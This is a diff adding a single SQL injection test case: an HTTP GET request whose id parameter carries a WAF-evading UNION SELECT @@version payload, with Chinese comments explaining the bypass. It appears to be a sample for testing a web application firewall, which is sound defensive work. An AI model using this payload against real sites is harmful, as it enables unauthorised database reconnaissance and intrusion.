@@ -1,0 +1,9 @@
+# SQL注入_GET_mysql_普通注入(等价关键字绕过)-06506269
+# 基于UNION查询进行等价关键字绕过注入，该SQL注入语句的攻击目的是获取数据库的版本信息。攻击手段使用了联合查询（union select）和@@version函数。通过将注入的语句与原始查询语句进行合并，以获取额外的结果。@@version函数用于获取数据库服务器的版本信息。通过执行这个注入语句，攻击者可以获取数据库的版本信息，这可以帮助他们确定数据库的类型和版本，从而寻找可能的漏洞和进行后续的攻击。
+GET /?id=1%20%7C%7C%201%20like%202e0union%20select%20@@version%20&bid=hd_tag_m8mv24c5 HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv24c5
+RM-PRO-Token: cc599377731654a794b49a403590e3b1
+RM-PRO-Time: 1742808374553
+User-Agent: curl/7.83.1
+
